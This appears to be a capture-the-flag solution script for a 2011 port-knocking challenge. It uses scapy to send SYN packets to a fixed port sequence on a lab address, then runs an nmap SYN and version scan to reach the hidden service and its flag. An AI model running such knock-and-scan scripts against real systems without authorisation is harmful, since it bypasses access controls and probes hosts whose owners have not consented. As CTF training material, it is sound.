#!/usr/bin/python
# sheldon.py
# EINDBAZEN solution to port knocking challenge PHD CTF Quals 2011
 
# Import scapy
from scapy.all import *
conf.verb = 0
# Ports
ports = [951, 4826, 9402, 235, 16821, 443, 100]
# Knock twice on every port
for dport in range(0, len(ports)):
    print "[*] Knocking on 192.168.0.5: " , ports[dport]
    ip = IP(dst="192.168.0.5")
    port = 39367
    SYN = ip/TCP(sport=port, dport=ports[dport], flags="S", window=2048, options=[('MSS',1460)], seq=0)
    send(SYN) ; print "*KNOCK*"
    port = 39368
    SYN = ip/TCP(sport=port, dport=ports[dport], flags="S", window=2048, options=[('MSS',1460)], seq=0)
    send(SYN) ; print "*KNOCK*"
    print "PENNY"
# Use NMAP for scanning for open ports
# We also use -sV, so nmap connects to the port and get the flag
print "[*] Scanning for open ports using nmap"
subprocess.call("nmap -sS -sV -T4 -p 1024-2048 192.168.0.5", shell=True)
